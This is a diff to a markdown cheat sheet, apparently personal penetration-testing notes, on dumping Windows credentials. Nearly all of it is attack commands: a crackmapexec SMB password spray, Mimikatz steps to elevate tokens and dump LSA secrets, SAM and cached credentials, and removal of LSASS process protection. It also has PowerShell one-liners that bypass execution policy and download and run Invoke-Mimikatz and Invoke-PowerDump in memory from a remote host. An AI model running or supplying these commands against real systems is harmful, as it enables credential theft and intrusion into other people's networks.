@@ -14,6 +14,8 @@ crackmapexec smb 192.168.165.122 -u user.txt -p password --continue-on-success
 
 <summary>Dumping Creds (Mimikatz Commands)</summary>
 
+**ALWAYS OPEN WITH ADMIN CMD.EXE**
+
 ```bash
 token::elevate
 privilege::debug
@@ -25,7 +27,7 @@ lsadump::secrets
 lsadump::cache
 ```
 
-```
+```powershell
 powershell -ep bypass -nop -c "iex (iwr http://IP/Invoke-PowerDump.ps1 -UseBasicParsing);Invoke-PowerDump"
 
 powershell -ep bypass -nop -c "iex (iwr http://IP/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"'"
@@ -51,7 +53,7 @@ ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 
 <pre><code><strong>mimikatz # !+
 </strong>mimikatz # !processprotect /process:lsass.exe /remove
-mimikatz # sekurlsa::logonpasswords)
+mimikatz # sekurlsa::logonpasswords
 </code></pre>
 
 </details>
